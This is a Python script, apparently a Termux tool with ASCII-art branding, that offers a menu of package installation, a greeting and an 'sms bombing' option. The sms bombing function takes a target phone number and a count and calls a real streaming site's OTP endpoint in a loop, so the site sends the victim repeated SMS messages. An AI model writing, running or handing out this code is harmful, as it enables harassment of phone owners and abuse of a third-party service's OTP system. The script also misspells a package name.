import os
import time as t
os.system("clear")
import sys

def logo():
    print(""" \033[0;33m+ 
        __gggrgM**M#mggg__
                __wgNN@"B*P""mp""@d#"@N#Nw__
              _g#@0F_a*F#  _*F9m_ ,F9*__9NG#g_
           _mN#F  aM"    #p"    !q@    9NL "9#Qu_
          g#MF _pP"L  _g@"9L_  _g""#__  g"9w_ 0N#p
        _0F jL*"   7_wF     #_gF     9gjF   "bJ  9h_
       j#  gAF    _@NL     _g@#_      J@u_    2#_  #_
      ,FF_#" 9_ _#"  "b_  g@   "hg  _#"  !q_ jF "*_09_
      F N"    #p"      Ng@       `#g"      "w@    "# t
     j p#    g"9_     g@"9_      gP"#_     gF"q    Pb L
     0J  k _@   9g_ j#"   "b_  j#"   "b_ _d"   q_ g  ##
     #F  `NF     "#g"       "Md"       5N#      9W"  j#
     #k  jFb_    g@"q_     _*"9m_     _*"R_    _#Np  J#
     tApjF  9g  J"   9M_ _m"    9%_ _*"   "#  gF  9_jNF
      k`N    "q#       9g@        #gF       ##"    #"j
      `_0q_   #"q_    _&"9p_    _g"`L_    _*"#   jAF,'
       9# "b_j   "b_ g"    *g _gF    9_ g#"  "L_*"qNF
        "b_ "#_    "NL      _B#      _I@     j#" _#"
          NM_0"*g_ j""9u_  gP  q_  _w@ ]_ _g*"F_g@
           "NNh_ !w#_   9#g"    "m*"   _#*" _dN@"
              9##g_0@q__ #"4_  j*"k __*NF_g#@P"
                "9NN#gIPNL_ "b@" _2M"Lg#N@F"

                    ""P@*NN#gEZgNN@#@P""
Art by lgbeard

		
███╗░░░███╗██╗░░░██╗██████╗░░█████╗░██████╗░
████╗░████║██║░░░██║██╔══██╗██╔══██╗██╔══██╗
██╔████╔██║██║░░░██║██████╔╝███████║██║░░██║
██║╚██╔╝██║██║░░░██║██╔══██╗██╔══██║██║░░██║
██║░╚═╝░██║╚██████╔╝██║░░██║██║░░██║██████╔╝
╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░


██████╗░██╗██████╗░░█████╗░██╗░░░██╗
██╔══██╗██║██╔══██╗██╔══██╗╚██╗░██╔╝
██████╔╝██║██║░░██║██║░░██║░╚████╔╝░
██╔══██╗██║██║░░██║██║░░██║░░╚██╔╝░░
██║░░██║██║██████╔╝╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░



        +\033[0m
        
   \033[0;32m+
       coder: Murad ridoy
	ｔｅａｃｈｅｒ: Ｎａｚｍｕｌ ｇｕｒｕ
        github:https://github.com/Murad-rhm
	+\033[0;32m
	Ｓｔｙｌｅ ｂｒｏ 
        +\033[0m
        """)
        
    t.sleep(0)
        
def basic():
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("pkg list-all")
    os.system("pkg update\n pkg upgrade\n pkg install git \npkg install python \npkg install python2 \npip install requestes \npip2 install requestes \npip install --upgrade pip \npip install mechanize \npip2 install mechanize \npkg install tree \npkg install wget \npkg install root-repo \npkg install unstable-repo \npkg install x11-repo")
    
def sms():
         
    import requests
    number=input("Enter your number: ")

#GET

    api="https://www.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

    amount=int(input("Amount: "))
    for i in range(amount):
        requests.get(api)
        print(str(i+1)+" SMS Sent")
        t.sleep(1)
         
def hi():
    print("\033[0;33m wellcome to \n\n my tools ...")
    print("""
    thank you very much
    see you later.
    by by
    tatta
    
    """)
    t.sleep(0.05)
    print("\033[0;31m Enter for next:\n ")
    input("[>>] ")    
n=3
while n<=5:
              
            logo()
            print("\033[0;36m \nChoose your option: \n\n[1] basic \n[2] hii\n[3]sms bombing: ")
            a=int(input("[>]="))
            if a==1:
                logo()
                t.sleep(0)
                basic()
                t.sleep(0.010)
    
                print("\033[0;36m [✓] done")
                t.sleep(3)
                os.system("clear")
                n=n+1
        
            elif a==2:
                logo()
                t.sleep(0.05)
                hi()
                os.system("clear")
                n=n+1
            elif a==3:
                logo()
                sms()
                t.sleep(2)
                os.system("clear")
                n=n+1
            else:
                os.system("clear")
                logo()
                print("\033[0;32m \n [×] invalid input")
                t.sleep(2)
                n=n+1
